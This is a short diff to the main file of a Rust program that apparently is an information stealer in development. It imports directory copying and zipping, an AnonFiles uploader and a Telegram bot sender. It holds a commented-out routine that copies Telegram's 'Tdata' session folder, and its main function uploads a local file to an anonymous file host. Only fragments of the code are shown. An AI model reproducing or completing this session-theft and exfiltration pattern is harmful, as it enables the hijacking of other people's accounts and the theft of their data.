@@ -6,8 +6,8 @@ use std::path::Path;
 
 use utils::filesystem::{copy_dirs, zip_dir};
 use utils::net::{AnonFilesUploader, TelegramBotSender};
-use utils::os::{get_directory_by_process, get_temp_dir_path};
-
+use utils::os::{get_temp_dir_path, get_processes_path};
+// use utils::find_path::{get_processes_path};
 // fn copy_telegram_session(mut telegram_folder: String) -> Result<(), String> {
 //     telegram_folder.push_str("\\Tdata");
 
@@ -32,6 +32,9 @@ use utils::os::{get_directory_by_process, get_temp_dir_path};
 
 //612753417
 fn main() {
+    // let path = get_processes_path();
+    // println!("{}", path);
+
     let url =
         AnonFilesUploader::new(r#"C:\Users\dev\Documents\repos\rust-test\Cargo.lock"#.to_string())
             .upload()
